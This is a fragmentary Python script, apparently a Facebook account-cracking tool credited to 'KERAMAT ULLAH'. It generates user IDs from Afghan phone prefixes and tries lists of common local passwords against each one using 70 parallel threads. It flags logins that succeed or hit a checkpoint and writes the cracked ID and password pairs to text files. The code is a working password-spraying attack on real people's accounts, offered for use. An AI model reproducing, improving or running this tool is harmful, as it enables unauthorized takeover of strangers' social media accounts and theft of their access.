...
os.system('xdg-open http://wa.me/+93792913215')
...
`MM    d'  `Mb(      db      )d' dM.     
 ...
 MMd'       `Mb   d' `Mb   d' d'  YM.   
 MMYM.       YM. ,P   YM. ,P ,P   `Mb   
 MM YM.      `Mb d'   `Mb d' d'    YM.  
 MM  YM.      YM,P     YM,P ,MMMMMMMMb  
 MM   YM.     `MM'     `MM' d'      YM. 
_MM_   YM._    YP       YP_dM_     _dMM_                                                                                                                                                                                                                                                                                                                                        
\33[1;37m----------------------------------------------
[•]  Owner      :  KERAMAT ULLAH
[•]  Facebook   :  KERAMAT ULLAH
[•]   Github     :  K+W+A
[•]   Tools   :  RANDOM 
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+93792913215?text=SA.101💜🐰Sir😪💕')
	if riaz1 =='3':
...
def m1():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 9370,9377,9378,9379,9376,****Etc')
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,2000,3000,5000,100000,****Etc')
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'Afghan123','Afghanistan','Afghan12345','kabul123','pubg123','pubg12345','Ahmad123','1234567','100200300']
...
def m2():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 9370,9377,9378,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','Afghanistan','Afghan12345','kabul123','pubg123','pubg12345','Ahmad123','1234567','100200300']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def m3():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'khan786','Afghan123','Afghanistan','Afghan12345','kabul123','pubg123','pubg12345','Ahmad123','1234567','100200300']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[KERAMAT-OK] '+cid+'|'+ps+'\033[0;97m')
                open('KERAMAT-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[KERAMAT-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('KERAMAT-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97m.KERAMAT\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
